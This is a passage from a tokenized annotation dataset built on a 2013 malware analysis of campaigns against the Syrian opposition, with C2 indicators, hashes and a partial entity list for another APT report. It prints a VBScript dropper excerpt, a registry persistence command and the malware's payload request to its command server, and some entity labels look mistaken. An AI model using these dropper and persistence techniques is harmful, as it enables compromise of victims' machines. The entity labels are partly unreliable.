"3d", "65", "63", "00"], ["61", "05", "00"], ["32", "44", "31", "43", "35", "45", "00", "63", "31", "3d", "4b", "00"], ["74", "69", "00"], ["31", "36", "33", "30", "33", "34", "................"], ["......"], ["EShadowTec"], ["h"], ["Rat", ",", "Version=1"], [".0.0.0", ",", "Culture=", "neutral", ",", "PublicK"], ["eyToken", "=", "null", "....", ".."], ["ShadowTech_Rat"], [".Data", "....."], ["data.i"], ["mage.bytes", "......"], ["......"], ["d102622021"], ["F2003240300362D6", "4380B43571016313", "D39002E2106080C0", "F25380708057A753", "30D77263531693E4", "47E1558785C", "..."], ["ShadowTech", "Rat", "is", "a", "Remote", "Access", "Trojan", "which", "appears", "to", "be", "widely", "available", "for", "download", "on", "both", "English", "and", "Arabic", "language", "sites", "."], ["Videos", "can", "be", "found", "on", "YouTube", "demonstrating", "its", "functionality", "."], ["The", "tool", "offers", "a", "range", "of", "options", "to", "the", "attacker", ",", "from", "keylogging", "and", "remote", "activation", "of", "the", "webcam", "to", "file", "exfiltration", "."], ["6", "Number", "18", "\u2013", "June", "2013", "ShadowTech", "RAT", "control", "console", ":", "File", "Date", "Countries", "of", "Submission", "svchost.exe", "2013", "-", "06", "-", "15", "23:08:19", "UTC", "Saudi", "Arabia", "7", "Number", "18", "\u2013", "June", "2013", "VPN-Pro.exe", "2013", "-", "06", "-", "15", "22:45:33", "UTC", "Turkey", ",", "Saudi", "Arabia", ",", "Morocco", "Both", "VPN-Pro.exe", "and", "svhost.exe", "have", "been", "submitted", "to", "VirusTotal", ":", "Both", "have", "relatively", "low", "detection", "rates", "by", "anti", "-", "virus", "software", "."], ["As", "of", "June", "20", ",", "2013", ",", "svchost.exe", "was", "only", "detected", "by", "four", "out", "of", "47", "tested", "anti", "-", "virus", "programs", ",", "while", "VPN-Pro.exe", "was", "only", "detected", "by", "five", "out", "of", "46", "."], ["The", "svchost.exe", "initiates", "an", "outbound", "connection", "to", "a", "command", "and", "control", "(", "C2", ")", "server", "hosted", "at", "thejoe.publicvm.com", "."], ["This", "domain", "resolves", "to", "an", "address", "inside", "Syrian", "IP", "space", ":", "31.9.48.119", "."], ["inetnum", ":", "netname", ":", "31.9.0.0", "-", "31.9.127.255"], ["SY", "-", "ISP", "-", "TARASSUL", "8", "Number", "18", "\u2013", "June", "2013", "descr", ":", "country", ":", "Tarassul", "inetnet", "Service", "Provider", "SY"], ["This", "is", "not", "the", "first", "time", "that", "malicious", "installer", "packages", "have", "been", "created", "for", "circumvention", "tools", "."], ["In", "2012", ",", "malicious", "installers", "for", "Green", "Simurgh", "\u2014", "a", "standalone", "proxy", "intended", "for", "Iranian", "users", "but", "also", "used", "by", "some", "Syrians", "\u2014", "were", "found", "in", "circulation", "."], ["The", "creators", "of", "Green", "Simurgh", "responded", "by", "posting", "a", "prominent", "warning", "on", "their", "website", "highlighting", "the", "presence", "of", "these", "malicious", "installers", "."], ["Last", "year", ",", "malware", "which", "purported", "to", "be", "the", "Tor", "Browser", "Bundle", "was", "found", "in", "the", "wild", "."], ["It", "was", "found", "to", "be", "backdoored", "by", "Gh0st", "RAT", "and", "exfiltrated", "data", "to", "an", "IP", "in", "China", "."], ["An", "attack", "using", "a", "malicious", "installer", "of", "a", "working", "and", "reputable", "security", "or", "proxy", "tool", "is", "especially", "pernicious", "as", "it", "targets", "users", "who", "likely", "recognize", "the", "importance", "of", "privacy", "and", "circumvention", ",", "and", "may", "believe", "that", "they", "have", "increased", "their", "privacy", "and", "security", "by", "installing", "the", "tool", "."], ["ATTACK", "2", ":", "A", "TARGETED", "CALL", "TO", "ARMS"], ["In", "this", "campaign", ",", "contact", "with", "targets", "was", "initiated", "through", "phishing", "e", "-", "mails", ",", "chat", "messages", "and", "Facebook", "posts", "."], ["Although", "we", "became", "aware", "of", "this", "campaign", "in", "early", "June", ",", "we", "have", "evidence", "that", "it", "may", "have", "started", "as", "early", "as", "January", "2013", "."], ["We", "believe", "that", "this", "campaign", "targeted", "\u2014", "at", "least", "in", "part", "\u2014", "high", "-", "profile", "members", "of", "the", "Syrian", "opposition", "."], ["Interestingly", ",", "the", "attack", "included", "targeting", "of", "at", "least", "one", "non", "-", "public", "address", "associated", "with", "internal", "opposition", "communications", "."], ["This", "indicates", "some", "degree", "of", "prior", "penetration", "of", "the", "opposition", "\u2014", "either", "through", "computer", "network", "intrusion", "or", "other", "intelligence", "gathering", "activities", "."], ["The", "potential", "victim", "in", "this", "attack", "first", "receives", "a", "message", "from", "an", "unknown", "source", ",", "in", "this", "case", ",", "a", "Gmail", "account", "with", "a", "nondescript", "name", "."], ["Example", "e", "-", "mail", ":", "9", "Number", "18", "\u2013", "June", "2013", "The", "e", "-", "mail", "contains", "text", ",", "an", "image", "(", "not", "shown", ")", ",", "and", "an", "attachment", "."], ["The", "text", "refers", "to", "a", "video", "of", "Sheikh", "Adnan", "al", "-", "Arour", "\u2014", "a", "Sunni", "pro", "-", "opposition", "cleric", "\u2014", "based", "in", "Saudi", "Arabia", ",", "calling", "for", "holy", "war", "against", "Assad", "and", "Hezbollah", "."], ["The", "user", "is", "led", "to", "believe", "that", "opening", "the", "zip", "file", ",", "which", "is", "descriptively", "titled", "as", "being", "the", "Sheikh", "\u2019s", "opinion", ",", "will", "provide", "access", "to", "the", "video", "."], ["While", "we", "have", "identified", "multiple", "different", "attacks", "with", "different", "zip", "files", ",", "the", "structure", "of", "all", "of", "these", "is", "consistent", "with", "the", "example", "described", "here", "."], ["Example", "zip", "files", ":", "\u202b", "\u0631\u0623\u064a", "\u0627\u0644", "\u0634", "\u064a\u062e", "\u0639\u062f\u0646", "\u0627\u0646", "\u0627\u0644", "\u0639\u0631\u0639\u0648\u0631", "\u0628", "\u0627\u0625\u0644\u0626", "\u062a", "\u0627\u0644\u0641", "\u0627\u0644", "\u0648\u0637", "\u0646\u064a", "\u0627\u0644", "\u0633\u0648\u0631\u064a\u202c.zip9", "\u202b", "\u0631\u0627\u0628", "\u0637", "\u2013", "\u0627\u0644", "\u0634", "\u064a\u062e", "\u0639\u062f\u0646", "\u0627\u0646", "\u0627\u0644", "\u0639\u0631\u0639\u0648\u0631"], ["\u064a", "\u0639", "\u0644\u0646", "\u0627\u0644", "\u062c\u0647\u0627\u062f\u202c.zip", "\u202b"], ["\u0627", "\u0635\u0627\u0628", "\u0629", "\u0627\u0644", "\u0645", "\u0628", "\u0639\u0648\u062b", "\u0627\u0644", "\u062f\u0648\u0644"], ["\u064a", "\u0627\u0627\u0644\u062e", "\u0636\u0631", "\u0627\u0627\u0644\u0628", "\u0631\u0627\u0647", "\u064a\u0645\u064a", "\u0628", "\u062c", "\u0644\u0637\u0629", "\u062f\u0645\u0627\u063a", "\u064a\u0629\u202c.zip"], ["\u202b\u062e\u0627\u0635", "\u062c\u062f\u0627", "\u062d\u0648\u0644", "\u0645\u062c\u0632\u0631\u0629", "\u0646", "\u0647\u0631", "\u0642", "\u0648\u064a", "\u0642", "\u0648\u0627\u0644", "\u0645", "\u0633\u0624\u0648\u0644", "\u0627\u0644", "\u062d", "\u0642", "\u064a", "\u0642\u064a", "\u0639", "\u0646\u0647\u0627\u202c.zip"], ["The", "zip", "file", "extracts", "to", "a", "Windows", "Shortcut", "file", "with", "the", "same", "name", "and", "a", ".lnk", "extension", "."], ["Example", ".lnk", "file", "\u201c", "Sample", "A", "\u201d", ":", "\u202b\u062a", "\u0627\u0644\u0641", "\u0627\u0644", "\u0639\u0631\u0639\u0648\u0631", "\u0639\u062f\u0646", "\u0627\u0646", "\u0627\u0644", "\u0634", "\u064a\u062e\u202c", "\u202b\u0627\u0644", "\u0633\u0648\u0631\u064a", "\u0627\u0644", "\u0648\u0637", "\u0646\u064a", "\u0628", "\u0627\u0625\u0644\u0626\u202c.lnk", "10", "Number", "18", "\u2013", "June", "2013", "Parsing", "these", "files", "reveals", "a", "URL", "embedded", "in", "the", "the", "file", "(", "bolded", "below", ")", "."], ["Parsing", "\u201c", "Sample", "A", "\u201d", ":", "source", "path", "/", "filename", ":", "1file", "modified", ":", "06/16/2013", "16:49:04", "[", "UTC", "]", "file", "accessed", ":", "06/19/2013", "22:00:22"], ["[", "UTC", "]", "file", "created", ":", "06/19/2013", "22:00:22", "[", "UTC", "]"], ["Target", "flags", ":", "HasLinkTargetIDList", ",", "HasLinkInfo", ",", "HasRelativePath", ",", "Has"], ["WorkingDir", ",", "HasArguments", ",", "HasIconLocation", ",", "IsUnicode", ",", "DisableLinkPathTracking", "Target", "attributes", ":", "FILE_ATTRIBUTE_ARCHIVE"], ["Target", "modified", ":", "07/17/2012", "22:58:51.981", "[", "UTC", "]"], ["Target", "accessed", ":", "07/17/2012", "22:58:51.981", "[", "UTC", "]"], ["Target", "created", ":", "07/17/2012", "22:58:51.981", "[", "UTC", "]"], ["Target", "ObjID", "time", ":", "12/27/2012", "10:55:02.540", "[", "UTC", "]"], ["File", "offset", ":", "0x00000000", "[", "0", "]"], ["Parsed", "size", ":", "0x000005b2"], ["[", "1458", "bytes", "]", "Target", "file", "size", ":", "0x00003000"], ["[", "12288", "bytes", "]"], ["Show", "cmd", ":", "[", "SW_SHOWNORMAL", "]", "ID", "List", ":", "{", "CLSID_MyComputer}\\C:\\Windows\\System32\\mshta.exe", "Volume", "Type", ":", "fixed"], ["Volume", "serial", "num", ":", "7203", "-", "8b23", "Volume", "label", ":", "\u255f", "\u00df", "\u2590", "\u2564", "\u2552", "\u255f", "\u00df\u03c0", "\u2550", "\u00df\u03c6", ":", "C", "Local", "base", "path", ":", "C:\\Windows\\System32\\mshta.exe"], ["Relative", "path", ":", ".."], ["\\", "..", "\\", ".."], ["\\Windows\\System32\\mshta.exe", "Working", "directory", ":", "C:\\Windows\\system32"], ["Cmdline", "args", ":", "http://[REDACTED]?url", "=", "http://www.youtube.com", "/", "watch?v", "="], ["jDkluDCn7fA"], ["Icon", "filename", ":", "%", "SystemRoot%\\system32\\SHELL32.dll", "Special", "Folder", "ID", ":", "CSIDL_SYSTEM"], ["Known", "Folder", "ID", ":", "1ac14e77", "-", "02e7", "-", "4e5d", "-", "b744", "-", "2eb1ae5198b7", "NETBIOS", "name", ":", "xp", "-", "pc", "Volume", "ID", ":", "32035a92", "-", "7032", "-", "4de3", "-", "846f", "-", "ed880ad23fa7", "Object", "ID", ":", "dd81bda8", "-", "5013", "-", "11e2", "-", "ab13", "-", "c0f8da734a02", "MAC", "address", ":", "c0", ":", "f8", ":", "da:73:4a:02", "format", "ID", "[", "value", "]", ":", "{", "b725f130", "-", "47ef-101a", "-", "a5f1", "-", "02608c9eebac", "}"], ["[", "mshta.exe\\", "\u256a", "\u00ba", "\u2518", "\u00e4", "\u256a", "\u00ac", "\u256a", "\u2556", "\u256a", "\u00bf", "\u2518", "\u00e8", "\u2518", "\u00e9", "]", "format", "ID", "[", "value", "]", ":", "{", "46588ae2", "-", "4cbc-4338", "-", "bbfc-139326986dce", "}", "[", "S-1", "-", "5", "-", "21", "-", "13484416121947693625", "-", "1007466904", "-", "1000", "]", "format", "ID", "[", "value", "]", ":", "{", "dabd30ed-0043", "-", "4789", "-", "a7f8", "-", "d013a4736622", "}", "[", "System32", "\u25b2", "(", "\u0393\u00c7\u00acC:\\Windows\u0393\u00c7\u00bc", ")", "]", "format", "ID", "[", "value", "]", ":", "{", "28636aa6", "-", "953d-11d2", "-", "b5d6", "-", "00c04fd918d0", "}"], ["[", "C:\\Windows\\System32\\mshta.exe", "]", "When", "the", "victim", "executes", "the", "Windows", "shortcut", ",", "they", "are", "directed", "to", "one", "of", "several", "malicious", "links", "depending", "on", "the", "zipfile", "that", "they", "were", "sent", "."], ["These", "are", "visible", "in", "the", "link", "parsing", "."], ["11", "Number", "18", "\u2013", "June", "2013", "Links", "embedded", "in", "the", "Windows", "shortcut", ":"], ["Link", "Sample", "A", "(", "active", ")", "http://[REDACTED]om", "/", "g.php?url", "=", "http://www.youtube.com", "/", "watch?v", "=", "jDkluDCn7fA", "Link", "Sample", "B", "(", "defunct", ")", "http://google-panel.html5.me/g.php?url=http://www.youtube.com/watch?v=Uw3Ny2A1WvQ"], ["Link", "Sample", "C", "(", "defunct", ")"], ["http://forgoogle.allalla.com/u.php?url=http://www.alkalimaonline.com/news.php?id=118868", "The", "victim", "is", "then", "shown", "either", "a", "YouTube", "video", "featuring", "Sheikh", "Adnan", "al", "-", "Arour", ",", "or", "a", "story", "on", "http://www.alkalimaonline.com", ",", "a", "Lebanese", "news", "site", "."], ["Example", "of", "YouTube", "video", "shown", "to", "victim", ":", "12", "Number", "18", "\u2013", "June", "2013", "The", "Malware"], ["While", "the", "victim", "sees", "the", "decoy", "YouTube", "video", "or", "news", "website", ",", "a", "php", "file", "(", "g.php", ")", "that", "contains", "a", "hexencoded", "malicious", "binary", "is", "fetched", "."], ["Excerpt", "from", "G.php:10"], ["Please", "wait", "..", "<", "script", "language='javascript", "'", ">", "document.location=", "''", ";", "<", "/script><HTML", ">", "<", "script", "language", "=", "vbs", ">"], ["Set", "o", "=", "CreateObject(\"Scripting", "."], ["FileSystemObject", "\"", ")"], ["Set", "s", "=", "CreateObject(\"WScript", "."], ["Shell", "\"", ")"], ["p", "=", "o.", "GetSpecialFolder(2)&\"\\1.exe", "\"", "t", "=", "split(\"4D,5A,90,0,3,0,0,0,4,0,0,0,FF", ",", "FF,0,0,B8,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0", ",", "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,0,0,0,E,1F", ",", "BA", ",", "E,0,B4", ",", "9,CD,21,B8,1,4C", ",", "CD,21,54,68,69,73,20,70,72,6F,67,72,61,6D,20,63,61,6E,6E,6F,74,2", "0,62,65,20,72,75,6E,20,69,6E,20,44,4F,53,20,6D,6F,64,65,2E", ",", "D", ",", "D", ",", "A,24,0,0,0,0,0,0", ",", "0,50,45,0,0,4C,1,3,0,44,20,B6,51,0,0,0,0,0,0,0,0,E0,0,2,1,B,1,8,0,0,CC,1,0,0,8,0", "13", "Number", "18", "\u2013", "June", "2013", ",", "0,0,0,0,0,3E", ",", "EA,1,0,0,20,0,0,0,0,0,0,0,0,40,0,0,20,0", ",", "<", "SNIP", ">", "<", "SNIP", ">", "<", "SNIP", ">", "<", "SNIP", ">", "<", "SNIP", ">", "<", "SNIP", ">", "<", "SNIP", ">", "<", "SNIP", ">", "11", "Once", "extracted", ",", "the", "binary", "of", "\u201c", "Sample", "A", "\u201d", "has", "the", "following", "properties", ":", "Build", "Date", "Comments", "FileDescription"], ["[", "Mon", "Jun", "10", "18:51:48", "2013", "UTC", "]"], ["This", "installation", "was", "built", "with", "Inno", "Setup", "."], ["Session", "Disconnection", "Utility", "The", "malware", "also", "adds", "a", "registry", "key", "to", "make", "it", "persistent", "across", "reboots", ":"], ["reg", "add", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows", "NT\\CurrentVersion\\Winlogon", "\"", "/v", "\"", "Shell", "\"", "/d", "\"", "C:\\WINDOWS\\explorer.exe", ",", "C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\atiapfxx.exe", "\"", "/f"], ["The", "malware", "contains", "strings", "referring", "to", "\u201c", "Data", "Protector", "v2", "\u201d", "which", "appears", "to", "refer", "a", "crypter", "that", "is", "12", "compatible", "with", "a", "range", "of", "RATs", "and", "advertised", "for", "download", "in", "a", "number", "of", "forums", "."], ["C:\\Users\\John\\Documents\\Visual", "Studio", "2012\\Projects\\Data", "Protector", "v2\\atiapfxx\\atiapfxx\\bin\\Release\\Obfuscated\\atiapfxx.pdb", "Command", "and", "Control"], ["Once", "the", "malware", "is", "successfully", "installed", "on", "the", "victim", "\u2019s", "computer", ",", "it", "communicates", "with", "a", "C2", "server", "at", ":", "tn5.linkpc.net"], ["On", "June", "11", ",", "this", "pointed", "to", "the", "following", "SyriaTel", "address", ":"], ["Domain", ":", "tn5.linkpc.net", "IP", ":", "94.252.198.112", "netnum", ":", "netname", ":", "94.252.192.0", "-", "94.252.255.255", "SY", "-", "SYRIATEL", "-", "MOBILE", "14", "Number", "18", "\u2013", "June", "2013", "descr", ":", "country", ":", "Syriatel", "3", "G", "SY"], ["This", "domain", "has", "been", "active", "since", "at", "least", "October", "2012", "and", "has", "pointed", "to", "many", "different", "addresses", "in", "Syrian", "IP", "space", "on", "both", "the", "SyriaTel", "and", "Tarassul", "ISPs", ",", "as", "well", "as", "AnchorFree", "VPN", "addresses", "."], ["The", "malware", "attempts", "to", "download", "a", "remote", "file", "called", "\u201c", "123.functions", "\u201d", ":"], ["GET", "/123.functions", "HTTP/1.1"], ["Accept", ":", "*", "/", "*"], ["Accept", "-", "Encoding", ":", "gzip", ",", "deflate"], ["User", "-", "Agent", ":", "Mozilla/4.0", "(", "compatible", ";", "MSIE", "7.0", ";", "Windows", "NT", "5.1", ";", "(", "R1", "1.5", ")", ";", ".NET4.0C", ";", ".NET4.0E", ";", ".NET"], ["CLR", "1.1.4322", ";", ".NET"], ["CLR", "2.0.50727", ";", ".NET"], ["CLR", "3.0.04506.30", ")"], ["Host", ":", "tn5.linkpc.net:81"], ["It", "was", "not", "possible", "to", "retrieve", "the", "remote", "file", "at", "the", "time", "of", "analysis", "."], ["CONCLUSIONS"], ["As", "the", "conflict", "in", "Syria", "drags", "on", ",", "digital", "campaigns", "targeting", "Syrian", "opposition", "have", "persisted", "."], ["We", "have", "chosen", "to", "highlight", "two", "attacks", "that", "are", "part", "of", "recent", "efforts", "by", "Pro", "-", "Government", "Electronic", "Actors", "to", "compromise", "opposition", "communications", "and", "steal", "their", "secrets", "."], ["These", "attacks", "cater", "to", "the", "opposition", "\u2019s", "communication", "behaviors", "and", "tactics", "."], ["They", "are", "indicative", "of", "a", "combination", "of", "prior", "intelligence", "about", "the", "opposition", ",", "and", "ingenuity", "in", "social", "engineering", "."], ["For", "example", ",", "many", "in", "the", "Syrian", "opposition", "are", "now", "aware", "of", "the", "electronic", "threats", "they", "face", "and", "seek", "out", "tools", "to", "increase", "their", "communications", "security", "and", "privacy", "."], ["Tools", "and", "information", "about", "security", "and", "communications", "are", "in", "constant", "circulation", "."], ["Some", "of", "this", "material", "addresses", "well", "-", "defined", "vulnerabilities", "."], ["We", "have", "observed", "a", "greater", "degree", "of", "care", "among", "many", "in", "the", "opposition", "when", "facing", "certain", "situations", "that", "were", "common", "attack", "modalities", "in", "2012", "."], ["As", "awareness", "grows", "and", "behavior", "evolves", ",", "we", "suspect", "that", "some", "of", "the", "attacks", "that", "we", "regularly", "observed", "in", "2012", "are", "much", "less", "successful", "today", "."], ["Some", "of", "the", "information", "and", "practices", "that", "are", "shared", "between", "users", ",", "however", ",", "are", "much", "less", "appropriate", ",", "even", "inadvertently", "dangerous", "."], ["For", "example", ",", "many", "legitimate", "tools", "are", "shared", "via", "third", "party", "file", "sharing", "sites", "or", "over", "social", "media", "."], ["This", "situation", "presents", "a", "rich", "variety", "of", "targets", "for", "attackers", "in", "which", "to", "seed", "malicious", "binaries", "and", "links", "masquerading", "as", "familiar", "or", "desirable", "tools", "."], ["We", "infer", "that", "from", "the", "point", "of", "view", "of", "these", "attackers", ",", "not", "all", "attacks", "need", "to", "have", "sophisticated", "malware", "in", "order", "to", "be", "successful", "enough", "to", "be", "worth", "doing", "."], ["Yet", ",", "perhaps", "in", "response", "to", "the", "growing", "awareness", "of", "previous", "and", "often", "widely", "targeted", "attacks", "against", "the", "Syrian", "opposition", ",", "attackers", "continue", "to", "innovate", "and", "15", "Number", "18", "\u2013", "June", "2013", "experiment", "with", "new", "techniques", "that", "blend", "social", "engineering", "with", "new", "attack", "styles", "."], ["The", "experiments", "are", "sometimes", "clearly", "successful", "."], ["For", "example", ",", "in", "the", "case", "of", "Attack", "2", ",", "the", "Windows", "shortcut", "files", "were", "not", "conclusively", "identified", "as", "malicious", "by", "even", "savvy", "opposition", "members", "for", "an", "extended", "period", "of", "time", "."], ["We", "hope", "that", "this", "post", "will", "increase", "awareness", "of", "the", "two", "attacks", "among", "potential", "targets", "."], ["In", "the", "meantime", ",", "users", "who", "have", "executed", "either", "the", "fake", "Freegate", "file", "or", "clicked", "on", "one", "of", "the", "Windows", "shortcut", "files", "should", "consider", "their", "computers", "and", "accounts", "compromised", "."], ["APPENDIX", ":", "RECOMMENDATIONS", "FOR", "FREEGATE", "AND", "FREEGATE", "USERS"], ["The", "Freegate", "website", "is", "blocked", "in", "China", "(", "its", "primary", "target", "market", ")", ",", "as", "is", "the", "case", "with", "other", "similar", "circumvention", "tools", "."], ["To", "get", "around", "blocking", ",", "tools", "are", "often", "distributed", "between", "individuals", ",", "or", "through", "untrusted", "downloads", "from", "third", "party", "sites", "."], ["This", "is", "an", "unfortunate", "vector", "for", "attackers", "to", "distribute", "malicious", "installers", "and", "bundles", "that", "also", "contain", "functional", "versions", "of", "the", "program", "."], ["As", "demonstrated", "by", "our", "work", "on", "the", "Freegate", "malware", ",", "as", "well", "as", "the", "Green", "Simurgh", "case", ",", "these", "vulnerabilities", "are", "exploited", "with", "serious", "consequences", "for", "high", "-", "risk", "users", "."], ["We", "understand", "the", "resource", "constraints", "that", "developers", "of", "free", "security", "and", "circumvention", "software", "often", "face", "."], ["As", "such", ",", "we", "propose", "two", "simple", "steps", "that", "Freegate", "could", "take", "to", "help", "mitigate", "the", "current", "and", "similar", "future", "threats", "."], ["\uf0b7", "1", ")", "Freegate", "should", "take", "steps", "to", "make", "their", "users", "aware", "of", "the", "threat", "."], ["We", "provided", "Freegate", "developers", "with", "details", "of", "the", "attack", ",", "copies", "of", "the", "malicious", "binary", ",", "and", "other", "details", "prior", "to", "publication", "."], ["We", "would", "like", "to", "point", "them", "towards", "the", "example", "established", "by", "Green", "Simurgh", ",", "who", "promptly", "posted", "a", "multilingual", "warning", "to", "their", "website", "when", "a", "malicious", "repackaging", "of", "their", "tool", "was", "found", "to", "be", "targeting", "Syrian", "users", "."], ["We", "have", "offered", "to", "help", "them", "translate", "any", "warning", "materials", "into", "Arabic", "."], ["\uf0b7", "2", ")"], ["Freegate", "should", "implement", "by", "-", "default", "HTTPS", "on", "their", "website", "."], ["Currently", ",", "visitors", "to", "the", "Freegate", "website", "follow", "non", "-", "HTTPS", "links", "to", "an", "unencrypted", "download", "."], ["We", "believe", "that", "this", "presents", "a", "clear", "risk", "for", "man", "-", "in", "-", "the", "-", "middle", "attacks", "."], ["Most", "developers", "of", "similar", "anticensorship", ",", "circumvention", ",", "and", "security", "tools", "have", "implemented", "this", "security", "measure", "."], ["We", "encourage", "Freegate", "to", "follow", "suit", "."], ["ACKNOWLEDGEMENTS"], ["Special", "thanks", "to", "several", "anonymous", "Syrians", "who", "brought", "these", "malware", "samples", "to", "our", "attention", "."], ["Additional", "thanks", "to", "Bill", "Marczak", ",", "Byron", "Sonne", ",", "Adam", "Senft", ",", "and", "Ron", "Deibert", "."], ["_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "16", "Number", "18", "\u2013", "June", "2013", "Footnotes", "1", "State", "-", "Sponsored", "Malware", ",", "\u201c", "Electronic", "Frontier", "Foundation", ",", "\u201d", "https://www.eff.org/issues/state-sponsoredmalware", "."], ["2"], ["We", "notified", "Freegate", "on", "June", "17", ",", "2013", "."], ["3", "MD5", "b3e1c2e40be54fbc0f7921ea8ce807e2"], ["SHA1", "3f6436420e84ac96d9a3c93045c07cdadda8ec81", "SHA256", "3712907740045871eef218fea7292c9c017e64cbb56b193b93f1a1b80afe599d", "4", "MD5", "8eda7dfa4ec4ac975bb12d2a3186bbeb", "SHA1", "b5c49bbbf7499a30110adc94480b3edbc8d6e92b", "SHA256", "829e137279f691e493c211108b62c8e15b079bd619ba19ad388450878e0585d0", "5"], ["It", "failed", "to", "execute", "with", ".NET", "4.0", "on", "Windows", "XP", "."], ["6"], ["The", "implant", "is", "installed", "regardless", "of", "whether", "or", "not", "the", "victim", "completes", "the", "FreeGate", "installation", "process", "."], ["7"], ["The", "file", "fg735p.exe", "matches", "the", "hash", "of", "a", "legitimate", "FreeGate", "installer", "."], ["MD5", "b083418be502162a4e248faab363f1b9", "SHA1", "030937f008bc203198e3754b1b54bb6d8d72794b"], ["SHA256", "d6ded89b91cdcd5d9ad4f6453f38f04f11f608d8db77db09e7400cfd7bcecddf", "8", "MD5", "2ba789458781b1dfd7f34624c8410edb", "SHA1", "77fd62d8e630e74d637682b91d0952d48b7c52be", "SHA256", "80b3fa8113a89040048a87c63ab9d8117368f2579368f5ea5999b145c47c4490", "9", "MD5", "59c6e0fa61d62a1f52b6092dc92a4aa7"], ["SHA1", "fce82013dbb9261db8b14451122fa889dfdba2e0", "SHA256", "71cb3e1007da3193c89a532b275cf539730b25bd63bcc5e912503ddd4bc9097f", "10"], ["MD5", "61a26c391aa95084521f5c0f6f70b966", "SHA1", "bd901cf02778d5c76dfe7c2877d773baa5bae5a7", "SHA256", "2c7600e0e660b0788faf5f5de3c10ac257000a557278eba41d3e7ec6175f22fb", "11", "MD5", "00cc589571fa6e078cb92b34ea2ee1cc"], ["SHA1", "bfe30069998c5e4c43f98f17538678074d02ca3d", "SHA256", "bcf32f82f0971c8984bb493f5473f0f417c203c0484c80a772ee1165a8c7675d", "12"], ["For", "example", ",", "see", ":", "http://undercrypter.blogspot.de/2013/03/blog-post.html", "."], ["17"]]}, {"vertexSet": [[{"name": "Trojan.APT.Seinup", "pos": [0, 3], "sent_id": 0, "type": "TrojanHorse"}], [{"name": "FireEye", "pos": [1, 2], "sent_id": 2, "type": "Organization"}], [{"name": "Asia", "pos": [14, 15], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "ASEAN", "pos": [16, 17], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "Brunei", "pos": [7, 8], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Cambodia", "pos": [9, 10], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Indonesia", "pos": [11, 12], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Laos", "pos": [13, 14], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Malaysia", "pos": [15, 16], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Myanmar", "pos": [17, 18], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Philippines", "pos": [19, 20], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Singapore", "pos": [21, 22], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Thailand", "pos": [23, 24], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Vietnam", "pos": [26, 27], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Backdoor.Makadocs", "pos": [10, 13], "sent_id": 9, "type": "Malware"}], [{"name": "Takashi Katsuki", "pos": [16, 18], "sent_id": 9, "type": "Payload"}], [{"name": "CVE-2012-0158", "pos": [14, 17], "sent_id": 14, "type": "Vulnerability"}], [{"name": "exp1ore.exe", "pos": [27, 28], "sent_id": 14, "type": "Dropper"}], [{"name": "wab.exe", "pos": [5, 6], "sent_id": 15, "type": "Payload"}], [{"name": "wab32res.dll", "pos": [12, 13], "sent_id": 15, "type": "Payload"}], [{"name": "wab.exe", "pos": [2, 3], "sent_id": 16, "type": "Payload"}], [{"name": "wab32res.dll", "pos": [8, 9], "sent_id": 16, "type": "Payload"}], [{"name": "wab32res.dll", "pos": [8, 9], "sent_id": 17, "type": "Payload"}], [{"name": "Trojan.APT.Seinup", "pos": [5, 8], "sent_id": 20, "type": "TrojanHorse"}], [{"name": "elizabearden.com", "pos": [5, 6], "sent_id": 27, "type": "Indicator"}], [{"name": "liangcheng04@sina.com", "pos": [0, 1], "sent_id": 28, "type": "Email"}], [{"name": "124.172.243.211", "pos": [3, 4], "sent_id": 28, "type": "Address"}], [{"name": "50.117.115.83", "pos": [0, 1], "sent_id": 29, "type": "Address"}], [{"name": "50.117.115.84", "pos": [0, 1], "sent_id": 30, "type": "Address"}], [{"name": "50.117.120.235", "pos": [1, 2], "sent_id": 30, "type": "Address"}], [{"name": "69.46.84.51", "pos": [0, 1], "sent_id": 31, "type": "Address"}], [{"name": "175.100.206.183", "pos": [1, 2], "sent_id": 31, "type": "Address"}], [{"name": "winshell.net", "pos": [2, 3], "sent_id": 31, "type": "Indicator"}], [{"name": "58.64.190.34", "pos": [3, 4], "sent_id": 31, "type": "Address"}], [{"name": "philnewsonline.com", "pos": [5, 6], "sent_id": 31, "type": "Indicator"}], [{"name": "www.info-week.com", "pos": [6, 7], "sent_id": 31, "type": "Indicator"}], [{"name": "go-twitter.com", "pos": [7, 8], "sent_id": 31, "type": "Indicator"}], [{"name": "50.93.198.128", "pos": [0, 1], "sent_id": 32, "type": "Address"}], [{"name": "173.254.197.213", "pos": [1, 2], "sent_id": 32, "type": "Address"}], [{"name": "50.93.198.113", "pos": [2, 3], "sent_id": 32, "type": "Address"}], [{"name": "dnsserviceonline.com", "pos": [6, 7], "sent_id": 32, "type": "Indicator"}], [{"name": "liangcheng04@sina.com", "pos": [15, 16], "sent_id": 32, "type": "Email"}], [{"name": "Smartwise9851@yahoo.com", "pos": [24, 25], "sent_id": 32, "type": "Email"}], [{"name": "richardmatind@yahoo.com", "pos": [5, 6], "sent_id": 34, "type": "Email"}], [{"name": "woooyeahh11@yahoo.com", "pos": [12, 13], "sent_id": 34, "type": "Email"}], [{"name": "woooyeahh11@yahoo.com", "pos": [0, 1], "sent_id": 35, "type": "Email"}], [{"name": "woooyeahh11@yahoo.com", "pos": [6, 7], "sent_id": 36, "type": "Email"}], [{"name": "iexp1ore.exe", "pos": [0, 1], "sent_id": 38, "type": 